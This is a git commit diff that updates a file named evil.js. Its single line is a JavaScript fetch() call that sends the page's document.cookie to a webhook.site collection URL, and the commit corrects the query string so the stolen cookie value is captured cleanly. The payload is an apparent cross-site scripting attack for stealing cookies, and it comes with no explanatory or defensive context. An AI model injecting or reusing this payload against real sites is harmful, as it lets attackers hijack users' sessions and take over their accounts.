8707f56784145e7fea9ee14b19dad43c86ecab31
Govind Venugopalan <cricketer94@users.noreply.github.com>
2024-02-23 18:16:00 +0800

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,1 +1,1 @@
-fetch("https://webhook.site/3e2bf325-8f22-4fa5-8dc4-a027d6fed198/?cookie"+document.cookie)
+fetch("https://webhook.site/3e2bf325-8f22-4fa5-8dc4-a027d6fed198/?cookie="+document.cookie)
